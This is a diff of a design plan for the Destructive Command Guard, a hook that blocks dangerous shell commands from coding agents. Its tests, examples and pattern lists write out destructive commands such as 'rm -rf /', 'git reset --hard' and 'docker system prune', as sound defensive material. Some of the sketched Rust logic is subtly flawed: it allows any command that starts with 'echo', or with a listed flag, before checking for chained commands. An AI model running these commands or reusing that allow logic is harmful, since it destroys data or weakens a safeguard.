@@ -1,79 +1,807 @@
 # DCG Improvement Plan
 
 > **Author:** Claude Opus 4.5
-> **Date:** 2026-01-07
-> **Status:** Proposal
+> **Date:** 2026-01-07 (Revised 2026-01-08)
+> **Status:** Proposal (Enhanced Hybrid Version)
 > **Scope:** Strategic improvements to make DCG more robust, reliable, performant, intuitive, and user-friendly
 
 ---
 
 ## Executive Summary
 
-This document presents five strategic improvements to the Destructive Command Guard (DCG) project, selected from an initial pool of 30 ideas through rigorous evaluation. Each improvement was assessed on four dimensions:
+This document presents seven strategic improvements to the Destructive Command Guard (DCG) project, selected from an initial pool of 30 ideas through rigorous evaluation. The improvements are ordered by **dependency and impact**—foundational correctness must come before user-facing features.
+
+### Evaluation Criteria
+
+Each improvement was assessed on four dimensions:
 
 1. **Impact** — How significantly does this improve the user experience?
 2. **Pragmatism** — How practical is implementation given current architecture?
 3. **User Perception** — How will users receive this change?
 4. **Risk** — What could go wrong, and how do we mitigate it?
 
-The five selected improvements form a coherent strategy that transforms DCG from "a hook that blocks things" into "a trusted security layer that users understand, can customize, and that protects entire teams."
+### The Seven Improvements (Ranked by Implementation Order)
 
-### The Five Improvements (Ranked)
+| Rank | Improvement | Primary Value | Phase |
+|------|-------------|---------------|-------|
+| 1 | Core Correctness & Determinism | Foundation & Trust | Must-Fix |
+| 2 | False Positive Immunity (Execution Context) | Velocity & Adoption | Critical |
+| 3 | Explain Mode with Full Decision Trace | Transparency & Debugging | High |
+| 4 | Allowlisting by Rule ID | Customization & Safety | High |
+| 5 | Tiered Heredoc & Inline Script Scanning | Deep Protection | Medium |
+| 6 | Pre-Commit Hook & GitHub Action | Team-Wide Protection | Medium |
+| 7 | Test Infrastructure & Performance Guardrails | Reliability & Sustainability | Ongoing |
 
-| Rank | Improvement | Primary Value |
-|------|-------------|---------------|
-| 1 | Explain Mode with Full Decision Trace | Transparency & Trust |
-| 2 | Project-Specific Allowlists with Learning | False Positive Resolution |
-| 3 | Pre-Commit Hook Integration | Codebase Protection |
-| 4 | Comprehensive Test Infrastructure | Reliability Guarantee |
-| 5 | GitHub Action for CI/CD Protection | Team-Wide Security |
+The improvements form a coherent strategy that transforms DCG from "a hook that blocks things" into "a trusted security layer that users understand, can customize, and that protects entire teams."
 
 ---
 
 ## Table of Contents
 
-1. [Explain Mode with Full Decision Trace](#1-explain-mode-with-full-decision-trace)
-2. [Project-Specific Allowlists with Learning](#2-project-specific-allowlists-with-learning)
-3. [Pre-Commit Hook Integration](#3-pre-commit-hook-integration)
-4. [Comprehensive Test Infrastructure](#4-comprehensive-test-infrastructure)
-5. [GitHub Action for CI/CD Protection](#5-github-action-for-cicd-protection)
-6. [Implementation Roadmap](#implementation-roadmap)
-7. [Success Metrics](#success-metrics)
-8. [Appendix: Ideas Not Selected](#appendix-ideas-not-selected)
+1. [Current Actual State (Important Gaps)](#current-actual-state-important-gaps)
+2. [Design Principles](#design-principles)
+3. [Core Correctness & Determinism](#1-core-correctness--determinism)
+4. [False Positive Immunity (Execution Context Layer)](#2-false-positive-immunity-execution-context-layer)
+5. [Explain Mode with Full Decision Trace](#3-explain-mode-with-full-decision-trace)
+6. [Allowlisting by Rule ID](#4-allowlisting-by-rule-id)
+7. [Tiered Heredoc & Inline Script Scanning](#5-tiered-heredoc--inline-script-scanning)
+8. [Pre-Commit Hook & GitHub Action](#6-pre-commit-hook--github-action)
+9. [Test Infrastructure & Performance Guardrails](#7-test-infrastructure--performance-guardrails)
+10. [Comprehensive Ideas Analysis (30 Ideas)](#comprehensive-ideas-analysis-30-ideas)
+11. [Implementation Roadmap](#implementation-roadmap)
+12. [Success Metrics](#success-metrics)
 
 ---
 
-## 1. Explain Mode with Full Decision Trace
+## Current Actual State (Important Gaps)
+
+Before proposing improvements, we must acknowledge the current gaps that undermine trust and effectiveness. These must be fixed before adding new features.
+
+### Gap 1: Non-Core Packs Are Unreachable in Hook Mode
+
+There is an early-return quick reject that only checks for `git`/`rm` keywords. If a command is `docker ...` or `kubectl ...`, the hook returns before evaluating packs. This means **enabled packs can silently not run**.
+
+**Trust-killer**: `dcg test` might report "BLOCKED," while the actual hook would allow the same command.
+
+**Location**: `src/main.rs:587`, `src/packs/mod.rs:383` (`global_quick_reject` only checks `git`/`rm`)
+
+**Reproduction**:
+```bash
+# With containers.docker enabled:
+echo '{"tool_name":"Bash","tool_input":{"command":"docker system prune"}}' | dcg
+# Expected: DENY (pack containers.docker, pattern system-prune)
+# Actual: ALLOW (early return before pack evaluation)
+```
+
+### Gap 2: Decision Nondeterminism
+
+Pack evaluation order can be derived from `HashSet` iteration order. If multiple packs match, the chosen pack/reason can vary run-to-run.
+
+**Why this matters**:
+- Unreliable debugging ("why did it block differently this time?")
+- Allowlisting by rule ID fails if rule ID changes
+- Inconsistent E2E test results
+- Eroded user trust
+
+### Gap 3: Duplicate Legacy Matching Logic
+
+Legacy pattern matching is duplicated in `src/main.rs` in addition to the pack system. This creates:
+- Drift between implementations
+- "Works in one mode but not the other" bugs
+- Maintenance burden
+
+### Gap 4: Per-Command Regex Compilation
+
+Config overrides that compile regex at runtime per command introduce latency spikes and unpredictability. Patterns should be precompiled at startup.
+
+### Gap 5: Naming Drift
+
+References to `git_safety_guard` remain in env vars, comments, and scripts. Naming confusion causes misconfiguration.
+
+### Gap 6: False Positives via Context Blindness
+
+The core UX pain: substring matching blocks commands that merely *mention* dangerous commands in strings (commit messages, issue descriptions, grep patterns).
+
+**Examples that MUST be allowed**:
+- `bd create --description="This blocks rm -rf"`
+- `git commit -m "Fix git reset --hard detection"`
+- `echo "example: git push --force"`
+- `rg -n "rm -rf" src/main.rs`
+
+---
+
+## Design Principles
+
+These principles guide all decisions and trade-offs.
+
+### P0: Never Hang, Never Crash, Never Spike Unpredictably
+
+This tool runs for every Bash command. Stability and bounded worst-case behavior is non-negotiable.
+
+- Maximum command processing time: 10ms (hard cap)
+- Fail-open on any timeout or parse error (with logging)
+- No unbounded recursion or allocation
+
+### P1: Default Allow, Confidently Deny Known Catastrophes
+
+Unrecognized commands should not break workflows. But high-confidence catastrophic commands should be denied.
+
+- Unknown → Allow
+- Ambiguous → Allow (or warn, never hard deny)
+- Known dangerous → Deny with clear explanation
+
+### P2: Deterministic and Explainable Decisions
+
+Same input → same decision → same attribution. Every time.
+
+- Stable pack ordering (explicit tiers, not hash iteration)
+- Pattern identity: `(pack_id, pattern_name)` in all output
+- Decision trace available via `dcg explain`
+
+### P3: False Positives Are a First-Class Problem
+
+False positives destroy trust and velocity. A guard that users disable is strictly worse than a slightly less strict guard that stays enabled.
+
+- Context-aware detection (data vs executed)
+- Easy allowlisting (by rule ID, not raw regex)
+- Observe mode for safe rollout
+
+### P4: Incremental Delivery
+
+Prefer small, test-driven, high-impact increments:
+
+1. Fix correctness first
+2. Then reduce false positives
+3. Then add deeper scanning
+4. Then add UX/explainability
+5. Always maintain performance budgets and tests
+
+---
+
+## 1. Core Correctness & Determinism
 
 ### Overview
 
-Explain mode is a new `dcg explain "command"` subcommand that reveals the complete decision-making process for any command. It shows users exactly why a command was blocked or allowed, what patterns were checked, and what alternatives exist.
+Before any new features, we must fix the foundational bugs that undermine trust. This improvement addresses pack reachability, decision determinism, evaluator unification, and config precompilation.
 
-### The Problem It Solves
+### The Problems
 
-When DCG blocks a command, users are presented with a reason, but not the full context:
+1. **Pack Reachability Bug**: Enabled packs don't run if the global quick reject doesn't see their keywords
+2. **Nondeterminism**: `HashSet` iteration order makes decisions unpredictable
+3. **Duplicate Logic**: Hook mode and CLI use different code paths
+4. **Runtime Compilation**: Config overrides compile regex per-command
 
+### The Solutions
+
+#### 1.1 Pack-Aware Global Quick Reject
+
+Replace the hardcoded `git`/`rm` check with a dynamic keyword union from all enabled packs.
+
+```rust
+/// Compute the union of keywords from all enabled packs.
+fn compute_enabled_keywords(config: &Config) -> Vec<&'static str> {
+    let enabled_packs = config.expand_enabled_packs();
+    enabled_packs
+        .iter()
+        .flat_map(|pack_id| REGISTRY.get(pack_id).map(|p| p.keywords))
+        .flatten()
+        .collect::<HashSet<_>>()
+        .into_iter()
+        .collect()
+}
+
+/// Global quick reject: only skip if NO enabled pack keywords appear.
+pub fn global_quick_reject(command: &str, enabled_keywords: &[&str]) -> QuickRejectResult {
+    let cmd_bytes = command.as_bytes();
+    for kw in enabled_keywords {
+        if memmem::find(cmd_bytes, kw.as_bytes()).is_some() {
+            return QuickRejectResult::Continue; // Keyword found, proceed to evaluation
+        }
+    }
+    QuickRejectResult::Skip // No keywords, safe to skip
+}
 ```
-╔══════════════════════════════════════════════════════════════╗
-║  ⚠️  BLOCKED: Destructive Command Detected                   ║
-╠══════════════════════════════════════════════════════════════╣
-║  Command: git reset --hard HEAD~5                            ║
-║  Reason:  Hard reset can permanently lose commits            ║
-║  Pack:    core.git                                           ║
-╚══════════════════════════════════════════════════════════════╝
+
+**User Impact**: "Docker/kubectl protections actually work."
+
+#### 1.2 Deterministic Pack Ordering
+
+Evaluate packs in a stable, documented order using explicit tiers:
+
+```rust
+/// Pack evaluation tiers (evaluated in order, first match wins).
+const PACK_TIERS: &[&[&str]] = &[
+    // Tier 0: Core safety (always first)
+    &["core.git", "core.filesystem"],
+
+    // Tier 1: Infrastructure
+    &["infrastructure.terraform", "infrastructure.ansible", "infrastructure.pulumi"],
+
+    // Tier 2: Containers & Orchestration
+    &["containers.docker", "containers.podman", "kubernetes.kubectl", "kubernetes.helm"],
+
+    // Tier 3: Databases
+    &["database.postgresql", "database.mysql", "database.mongodb", "database.redis"],
+
+    // Tier 4: Strict policies (opt-in)
+    &["strict_git.force_push", "strict_git.branch_delete"],
+
+    // Tier 5: Package managers
+    &["package_managers.npm", "package_managers.cargo", "package_managers.pip"],
+];
+
+/// Evaluate packs in tier order, returning stable (pack_id, pattern_name).
+pub fn evaluate_packs(command: &str, enabled_packs: &HashSet<&str>) -> Option<Match> {
+    for tier in PACK_TIERS {
+        for pack_id in *tier {
+            if !enabled_packs.contains(pack_id) {
+                continue;
+            }
+            if let Some(pack) = REGISTRY.get(pack_id) {
+                if let Some(pattern) = pack.check(command) {
+                    return Some(Match {
+                        pack_id: pack_id.to_string(),
+                        pattern_name: pattern.name.to_string(),
+                        reason: pattern.reason.to_string(),
+                    });
+                }
+            }
+        }
+    }
+    None
+}
 ```
 
-Users immediately ask:
-- "Why was this specific pattern matched and not another?"
-- "What regex actually matched my command?"
-- "Are there safe patterns I could have used instead?"
-- "How do I test if my allowlist entry will work?"
+**User Impact**: "Deny reasons don't change randomly."
 
-Without answers, users lose trust. They may disable DCG entirely rather than debug it.
+#### 1.3 Stable Match Identity
+
+Every denial includes `(pack_id, pattern_name)`:
+
+```rust
+#[derive(Debug, Clone, Serialize)]
+pub struct Match {
+    pub pack_id: String,
+    pub pattern_name: String,
+    pub reason: String,
+    pub matched_text: String,
+    pub matched_span: (usize, usize),
+}
+
+// JSON output includes stable identity
+{
+  "hookSpecificOutput": {
+    "permissionDecision": "deny",
+    "permissionDecisionReason": "Hard reset can permanently lose commits",
+    "matchedRule": {
+      "packId": "core.git",
+      "patternName": "hard-reset"
+    }
+  }
+}
+```
+
+**User Impact**: "Block messages feel concrete and actionable. I can allowlist by rule ID."
+
+#### 1.4 Shared Evaluator
+
+Hook mode and `dcg test` must call identical evaluation logic:
+
+```rust
+/// The single source of truth for command evaluation.
+/// Used by both hook mode and CLI.
+pub fn evaluate_command(
+    command: &str,
+    config: &Config,
+    trace: Option<&mut ExplainTrace>,
+) -> Decision {
+    // 1. Quick reject (pack-aware)
+    // 2. Normalize command
+    // 3. Check allowlist
+    // 4. Evaluate safe patterns
+    // 5. Evaluate destructive patterns (tiered order)
+    // 6. Default allow
+}
+
+// Hook mode
+fn hook_main() {
+    let decision = evaluate_command(&command, &config, None);
+    // ...
+}
+
+// CLI mode
+fn cli_test(command: &str) {
+    let decision = evaluate_command(command, &config, None);
+    println!("{:?}", decision);
+}
+
+// Explain mode
+fn cli_explain(command: &str) {
+    let mut trace = ExplainTrace::new();
+    let decision = evaluate_command(command, &config, Some(&mut trace));
+    println!("{}", trace.format());
+}
+```
+
+**User Impact**: "What I see in `dcg test` is what the hook enforces."
+
+#### 1.5 Precompile Override Regex
+
+Compile config overrides once at startup, not per-command:
+
+```rust
+pub struct CompiledConfig {
+    /// Precompiled regex patterns from config overrides.
+    pub compiled_overrides: Vec<CompiledOverride>,
+    /// Precomputed enabled pack IDs.
+    pub enabled_pack_ids: HashSet<String>,
+    /// Precomputed keyword union for quick reject.
+    pub enabled_keywords: Vec<&'static str>,
+}
+
+impl CompiledConfig {
+    pub fn from_config(config: &Config) -> Result<Self, ConfigError> {
+        let compiled_overrides = config.overrides
+            .iter()
+            .filter_map(|o| {
+                match Regex::new(&o.pattern) {
+                    Ok(regex) => Some(CompiledOverride { regex, action: o.action }),
+                    Err(e) => {
+                        tracing::warn!("Invalid override pattern '{}': {}", o.pattern, e);
+                        None
+                    }
+                }
+            })
+            .collect();
+
+        // ... precompute enabled packs and keywords
+
+        Ok(Self { compiled_overrides, enabled_pack_ids, enabled_keywords })
+    }
+}
+```
+
+**User Impact**: "No more random latency spikes."
+
+### Tests Required
+
+```rust
+#[test]
+fn test_docker_pack_reachable_in_hook_mode() {
+    let config = Config::with_pack_enabled("containers.docker");
+    let input = r#"{"tool_name":"Bash","tool_input":{"command":"docker system prune"}}"#;
+    let decision = hook_evaluate(input, &config);
+    assert!(matches!(decision, Decision::Deny { .. }));
+}
+
+#[test]
+fn test_deterministic_pack_attribution() {
+    let config = Config::default();
+    let command = "git reset --hard HEAD";
+
+    let results: Vec<_> = (0..100)
+        .map(|_| evaluate_command(command, &config, None))
+        .collect();
+
+    // All results must be identical
+    let first = &results[0];
+    assert!(results.iter().all(|r| r == first));
+}
+
+#[test]
+fn test_hook_cli_parity() {
+    let config = Config::default();
+    let commands = vec![
+        "git reset --hard",
+        "docker system prune",
+        "git status",
+        "echo hello",
+    ];
+
+    for cmd in commands {
+        let hook_result = simulate_hook(cmd, &config);
+        let cli_result = simulate_cli_test(cmd, &config);
+        assert_eq!(hook_result, cli_result, "Parity failure for: {}", cmd);
+    }
+}
+```
+
+### Implementation Phases
+
+**Phase A: Pack Reachability Fix (2 days)**
+- Implement pack-aware quick reject
+- Add regression tests for docker/k8s/db packs
+
+**Phase B: Deterministic Ordering (1-2 days)**
+- Define pack tiers
+- Implement ordered evaluation
+- Add determinism tests
+
+**Phase C: Shared Evaluator (2-3 days)**
+- Extract core evaluator to library
+- Update hook and CLI to use shared evaluator
+- Add parity tests
+
+**Phase D: Precompilation & Cleanup (1 day)**
+- Precompile config overrides
+- Remove legacy duplicate logic
+- Fix naming drift (git_safety_guard → dcg)
+
+---
+
+## 2. False Positive Immunity (Execution Context Layer)
+
+### Overview
+
+This is the **trust unlock**. We introduce an execution-context layer that distinguishes between bytes that are executed code vs bytes that are merely data (strings, comments, documentation). Only executable contexts are subject to destructive pattern matching.
+
+### The Problem
+
+Today's most damaging failure mode is blocking when the dangerous substring is **data**, not executed code. This creates:
+
+- Velocity-destroying interruptions for coding agents
+- Rapid loss of trust ("this tool is dumb / gets in the way")
+- Eventual disablement of the guard
 
 ### The Solution
 
-Explain mode provides complete transparency:
+A two-part approach:
+
+1. **Safe String-Argument Registry** (Phase A): Quick wins for known-safe commands
+2. **Execution-Context Tokenizer** (Phase B): General solution for all commands
+
+### 2.1 Safe String-Argument Registry
+
+A curated, versioned registry of commands whose arguments are data, not code:
+
+```rust
+/// Registry of commands with known-safe string arguments.
+/// Format: (command_prefix, arg_flags, context_type)
+static SAFE_STRING_ARGS: &[(&str, &[&str], ContextType)] = &[
+    // Git commit messages
+    ("git commit", &["-m", "--message"], ContextType::CommitMessage),
+    ("git tag", &["-m", "--message"], ContextType::TagMessage),
+    ("git notes add", &["-m", "--message"], ContextType::NoteMessage),
+
+    // Beads CLI
+    ("bd create", &["--description", "--title", "--notes"], ContextType::Documentation),
+    ("bd update", &["--description", "--title", "--notes"], ContextType::Documentation),
+
+    // Search tools (patterns are data, not executed)
+    ("grep", &["-e", "--regexp", "-f", "--file"], ContextType::SearchPattern),
+    ("rg", &["-e", "--regexp", "-f", "--file"], ContextType::SearchPattern),
+    ("ag", &["-p", "--pattern"], ContextType::SearchPattern),
+
+    // Output commands (arguments are data)
+    ("echo", &[], ContextType::EchoOutput),
+    ("printf", &[], ContextType::PrintfOutput),
+    ("cat", &["<<"], ContextType::HeredocData),
+
+    // Documentation generators
+    ("man", &[], ContextType::Documentation),
+    ("help", &[], ContextType::Documentation),
+];
+
+#[derive(Debug, Clone, Copy)]
+pub enum ContextType {
+    CommitMessage,
+    TagMessage,
+    NoteMessage,
+    Documentation,
+    SearchPattern,
+    EchoOutput,
+    PrintfOutput,
+    HeredocData,
+}
+
+/// Check if a command has a known-safe string argument context.
+pub fn check_safe_string_context(command: &str) -> Option<SafeContext> {
+    for (prefix, flags, context_type) in SAFE_STRING_ARGS {
+        if command.starts_with(prefix) {
+            // Check if command uses one of the safe flags
+            for flag in *flags {
+                if command.contains(flag) {
+                    return Some(SafeContext {
+                        command_prefix: prefix,
+                        flag: Some(flag),
+                        context_type: *context_type,
+                    });
+                }
+            }
+            // Some commands (echo, printf) are always safe
+            if flags.is_empty() {
+                return Some(SafeContext {
+                    command_prefix: prefix,
+                    flag: None,
+                    context_type: *context_type,
+                });
+            }
+        }
+    }
+    None
+}
+```
+
+**User Impact**: Immediate reduction in annoying blocks. Common documentation workflows work.
+
+### 2.2 Execution-Context Tokenizer
+
+A conservative shell tokenizer that classifies command spans:
+
+```rust
+/// Span of command text with execution context.
+#[derive(Debug, Clone)]
+pub struct Span {
+    pub start: usize,
+    pub end: usize,
+    pub kind: SpanKind,
+    pub text: String,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq)]
+pub enum SpanKind {
+    /// Executable command word (first word of pipeline segment)
+    Executed,
+    /// Argument that may be executed (needs pattern matching)
+    Argument,
+    /// Inline code that will be executed (bash -c, python -c, etc.)
+    InlineCode,
+    /// Data that will NOT be executed (string arguments, heredoc content)
+    Data,
+    /// Heredoc body (may contain executable content, needs deep analysis)
+    HeredocBody,
+    /// Unknown/ambiguous (treat conservatively as Executed)
+    Unknown,
+}
+
+/// Tokenize a command into spans with execution context.
+pub fn tokenize_command(command: &str) -> Vec<Span> {
+    let mut spans = Vec::new();
+    let mut parser = ShellParser::new(command);
+
+    while let Some(token) = parser.next_token() {
+        match token {
+            Token::CommandWord(text, range) => {
+                spans.push(Span {
+                    start: range.start,
+                    end: range.end,
+                    kind: SpanKind::Executed,
+                    text,
+                });
+            }
+            Token::Argument(text, range) => {
+                // Check if this argument is known-safe data
+                let kind = if is_safe_string_argument(&parser.context, &text) {
+                    SpanKind::Data
+                } else {
+                    SpanKind::Argument
+                };
+                spans.push(Span { start: range.start, end: range.end, kind, text });
+            }
+            Token::SingleQuoted(text, range) => {
+                // Single-quoted strings are literal data
+                spans.push(Span {
+                    start: range.start,
+                    end: range.end,
+                    kind: SpanKind::Data,
+                    text,
+                });
+            }
+            Token::DoubleQuoted(text, range) => {
+                // Double-quoted may contain substitutions
+                let kind = if contains_substitution(&text) {
+                    SpanKind::Unknown // Conservative
+                } else {
+                    SpanKind::Data
+                };
+                spans.push(Span { start: range.start, end: range.end, kind, text });
+            }
+            Token::CommandSubstitution(text, range) => {
+                // $(...) or `...` is executed
+                spans.push(Span {
+                    start: range.start,
+                    end: range.end,
+                    kind: SpanKind::Executed,
+                    text,
+                });
+            }
+            Token::InlineScript(text, range) => {
+                // bash -c "...", python -c "...", etc.
+                spans.push(Span {
+                    start: range.start,
+                    end: range.end,
+                    kind: SpanKind::InlineCode,
+                    text,
+                });
+            }
+            Token::HeredocBody(text, range) => {
+                spans.push(Span {
+                    start: range.start,
+                    end: range.end,
+                    kind: SpanKind::HeredocBody,
+                    text,
+                });
+            }
+            Token::Pipe | Token::And | Token::Or | Token::Semicolon => {
+                // Pipeline operators don't contribute spans
+                parser.start_new_segment();
+            }
+        }
+    }
+
+    spans
+}
+
+/// Evaluate patterns only against eligible spans.
+pub fn evaluate_with_context(command: &str, config: &Config) -> Decision {
+    let spans = tokenize_command(command);
+
+    // Fast path: if command matches safe string-arg registry, skip pattern matching
+    if let Some(safe_ctx) = check_safe_string_context(command) {
+        return Decision::Allow {
+            reason: format!("Safe context: {:?}", safe_ctx.context_type),
+        };
+    }
+
+    // Only evaluate executable spans
+    for span in &spans {
+        match span.kind {
+            SpanKind::Executed | SpanKind::InlineCode | SpanKind::Unknown => {
+                if let Some(m) = evaluate_packs(&span.text, &config.enabled_packs) {
+                    return Decision::Deny {
+                        pack_id: m.pack_id,
+                        pattern_name: m.pattern_name,
+                        reason: m.reason,
+                        matched_text: span.text.clone(),
+                        matched_span: (span.start, span.end),
+                    };
+                }
+            }
+            SpanKind::HeredocBody => {
+                // Heredoc bodies need deep analysis (see Section 5)
+                if let Some(m) = evaluate_heredoc(&span.text, config) {
+                    return Decision::Deny { /* ... */ };
+                }
+            }
+            SpanKind::Data | SpanKind::Argument => {
+                // Data spans are never matched against destructive patterns
+            }
+        }
+    }
+
+    Decision::Allow { reason: "No destructive patterns matched".to_string() }
+}
+```
+
+### Example: How Context Parsing Works
+
+```
+Command: git commit -m "Fix the rm -rf detection bug"
+
+Tokenization:
+┌─────────────────────────────────────────────────────────────┐
+│ [0:3]   "git"      → Executed (command word)               │
+│ [4:10]  "commit"   → Argument                               │
+│ [11:13] "-m"       → Argument                               │
+│ [14:44] "Fix the rm -rf detection bug"                     │
+│                    → Data (commit message flag)             │
+└─────────────────────────────────────────────────────────────┘
+
+Pattern Matching:
+- "git" span: no destructive match
+- "commit" span: no destructive match
+- "-m" span: no destructive match
+- Message span: SKIPPED (SpanKind::Data)
+
+Decision: ALLOW ✓
+```
+
+```
+Command: bash -c "rm -rf /"
+
+Tokenization:
+┌─────────────────────────────────────────────────────────────┐
+│ [0:4]   "bash"     → Executed (command word)               │
+│ [5:7]   "-c"       → Argument (inline script flag)         │
+│ [8:19]  "rm -rf /" → InlineCode (EXECUTED!)                │
+└─────────────────────────────────────────────────────────────┘
+
+Pattern Matching:
+- "bash" span: no destructive match
+- "-c" span: no match
+- Inline script span: MATCHED (core.filesystem:rm-rf-root)
+
+Decision: DENY ✗
+```
+
+### Conservative Design Principles
+
+1. **Ambiguous → Executed**: If we can't confidently classify a span as data, treat it as executable
+2. **Unknown commands → Full matching**: Only known-safe commands get data classification
+3. **Single quotes are data**: `'...'` is always literal (shell semantics)
+4. **Double quotes with substitution → Unknown**: `"$(...)"` might be dangerous
+
+### Tests Required
+
+```rust
+#[test]
+fn test_must_allow_documentation_commands() {
+    let allowed = vec![
+        r#"bd create --description="This blocks rm -rf attacks""#,
+        r#"git commit -m "Fix git reset --hard detection""#,
+        r#"echo "example: git push --force""#,
+        r#"rg -n "rm -rf" src/main.rs"#,
+        r#"printf "Dangerous: %s\n" "rm -rf /""#,
+    ];
+
+    for cmd in allowed {
+        let decision = evaluate_command(cmd, &Config::default(), None);
+        assert!(
+            matches!(decision, Decision::Allow { .. }),
+            "Should allow documentation command: {}", cmd
+        );
+    }
+}
+
+#[test]
+fn test_must_block_execution_contexts() {
+    let blocked = vec![
+        r#"bash -c "rm -rf /""#,
+        r#"python -c "import os; os.system('rm -rf /')""#,
+        r#"sh -c 'git reset --hard'"#,
+        r#"git status; rm -rf /"#,
+        r#"$(rm -rf /)"#,
+        r#"`rm -rf /`"#,
+    ];
+
+    for cmd in blocked {
+        let decision = evaluate_command(cmd, &Config::default(), None);
+        assert!(
+            matches!(decision, Decision::Deny { .. }),
+            "Should block execution context: {}", cmd
+        );
+    }
+}
+```
+
+### Implementation Phases
+
+**Phase A: Safe String-Argument Registry (2-3 days)**
+- Implement registry data structure
+- Add entries for git, bd, grep, rg, echo, printf
+- Unit tests for each entry
+- E2E regression tests for common false positives
+
+**Phase B: Minimal Conservative Tokenizer (3-5 days)**
+- Handle quotes/escapes, pipes, separators
+- Handle `$()`, backticks
+- Handle `-c`/`-e` inline script detection
+- Extensive unit tests
+
+**Phase C: Integration (1-2 days)**
+- Wire tokenizer into evaluation pipeline
+- Token-aware keyword gating (optional optimization)
+- Performance testing
+
+---
+
+## 3. Explain Mode with Full Decision Trace
+
+### Overview
+
+Explain mode is a `dcg explain "command"` subcommand that reveals the complete decision-making process. It shows users exactly why a command was blocked or allowed, what patterns were checked, how spans were classified, and what alternatives exist.
+
+### Why It Matters
+
+When DCG blocks a command, users immediately ask:
+- "Why was this specific pattern matched?"
+- "What regex actually matched?"
+- "Was my string argument classified correctly?"
+- "How do I test if my allowlist entry will work?"
+
+Without answers, users lose trust. Explain mode provides complete transparency.
+
+### The Solution
 
 ```
 $ dcg explain "git reset --hard HEAD~5"
@@ -86,48 +814,47 @@ $ dcg explain "git reset --hard HEAD~5"
 ║  Latency:  0.847ms                                                   ║
 ╠══════════════════════════════════════════════════════════════════════╣
 ║                                                                      ║
+║  EXECUTION CONTEXT ANALYSIS                                          ║
+║  ─────────────────────────────────────────────────────────────────── ║
+║                                                                      ║
+║  Span Analysis:                                                      ║
+║  ┌─────────────────────────────────────────────────────────────────┐ ║
+║  │ [0:3]   "git"           Executed   (command word)              │ ║
+║  │ [4:9]   "reset"         Argument                                │ ║
+║  │ [10:16] "--hard"        Argument                                │ ║
+║  │ [17:23] "HEAD~5"        Argument                                │ ║
+║  └─────────────────────────────────────────────────────────────────┘ ║
+║                                                                      ║
+║  Safe String-Arg Registry: NO MATCH                                  ║
+║  (Command "git reset" not in documentation registry)                 ║
+║                                                                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
 ║  PIPELINE TRACE                                                      ║
 ║  ─────────────────────────────────────────────────────────────────── ║
 ║                                                                      ║
-║  [1] Input Parsing                                          0.012ms  ║
-║      ├─ Tool: Bash                                                   ║
-║      └─ Command extracted: "git reset --hard HEAD~5"                 ║
-║                                                                      ║
-║  [2] Quick Reject Filter                                    0.003ms  ║
-║      ├─ Checking for: git, rm, docker, kubectl, ...                  ║
+║  [1] Quick Reject Filter                                    0.003ms  ║
+║      ├─ Enabled pack keywords: git, rm, docker, kubectl, ...        ║
 ║      ├─ Found: "git" at position 0                                   ║
-║      └─ Result: PASSED (command requires full analysis)              ║
+║      └─ Result: CONTINUE (requires full analysis)                    ║
 ║                                                                      ║
-║  [3] Path Normalization                                     0.001ms  ║
+║  [2] Command Normalization                                  0.001ms  ║
 ║      ├─ Input:  git reset --hard HEAD~5                              ║
 ║      ├─ Output: git reset --hard HEAD~5                              ║
-║      └─ Note: No path prefix to strip                                ║
+║      └─ Transformations: none                                        ║
 ║                                                                      ║
-║  [4] Project Allowlist Check                                0.015ms  ║
-║      ├─ Loaded: .dcg/allowlist.toml (3 entries)                      ║
-║      ├─ Checked patterns:                                            ║
-║      │   └─ "git commit -m" — NO MATCH                               ║
-║      │   └─ "bd create" — NO MATCH                                   ║
-║      │   └─ "echo" — NO MATCH                                        ║
-║      └─ Result: No allowlist match                                   ║
+║  [3] Allowlist Check                                        0.015ms  ║
+║      ├─ Checked 3 allowlist entries                                  ║
+║      └─ Result: NO MATCH                                             ║
 ║                                                                      ║
-║  [5] Safe Pattern Evaluation                                0.234ms  ║
-║      ├─ Pack: core.git (34 safe patterns)                            ║
-║      ├─ Checked patterns:                                            ║
-║      │   └─ checkout-new-branch: NO MATCH                            ║
-║      │   └─ checkout-orphan: NO MATCH                                ║
-║      │   └─ restore-staged-long: NO MATCH                            ║
-║      │   └─ ... (31 more patterns checked)                           ║
-║      └─ Result: No safe pattern matched                              ║
-║                                                                      ║
-║  [6] Destructive Pattern Evaluation                         0.156ms  ║
+║  [4] Pack Evaluation (Tier 0: Core)                         0.234ms  ║
 ║      ├─ Pack: core.git                                               ║
 ║      │   ├─ Pattern: hard-reset                                      ║
 ║      │   │   ├─ Regex: git\s+reset\s+--hard                          ║
-║      │   │   ├─ Match: "git reset --hard" (positions 0-15)           ║
+║      │   │   ├─ Match: "git reset --hard" (positions 0-16)           ║
 ║      │   │   └─ Reason: Hard reset can permanently lose commits      ║
-║      │   └─ MATCHED — stopping evaluation                            ║
-║      └─ Result: DENY (core.git:hard-reset)                           ║
+║      │   └─ MATCHED — evaluation stopped                             ║
+║      └─ Result: DENY                                                 ║
 ║                                                                      ║
 ╠══════════════════════════════════════════════════════════════════════╣
 ║                                                                      ║
@@ -135,8 +862,20 @@ $ dcg explain "git reset --hard HEAD~5"
 ║  ─────────────────────────────────────────────────────────────────── ║
 ║                                                                      ║
 ║      git reset --hard HEAD~5                                         ║
-║      ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔                                            ║
+║      ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔                                               ║
 ║      └─── matched ────┘                                              ║
+║                                                                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  MATCH IDENTITY                                                      ║
+║  ─────────────────────────────────────────────────────────────────── ║
+║                                                                      ║
+║  Pack ID:      core.git                                              ║
+║  Pattern Name: hard-reset                                            ║
+║  Rule ID:      core.git:hard-reset                                   ║
+║                                                                      ║
+║  To allowlist this specific rule:                                    ║
+║  dcg allowlist add core.git:hard-reset --reason "..."                ║
 ║                                                                      ║
 ╠══════════════════════════════════════════════════════════════════════╣
 ║                                                                      ║
@@ -149,52 +888,51 @@ $ dcg explain "git reset --hard HEAD~5"
 ║  • git revert HEAD~5..HEAD     — Creates inverse commits (safe)      ║
 ║  • git stash                   — Saves changes before reset          ║
 ║                                                                      ║
-║  To allow this specific command:                                     ║
-║  • dcg allow "git reset --hard HEAD~5" --reason "Intentional reset"  ║
+║  To allow this once:                                                 ║
+║  • dcg allow --once "git reset --hard HEAD~5"                        ║
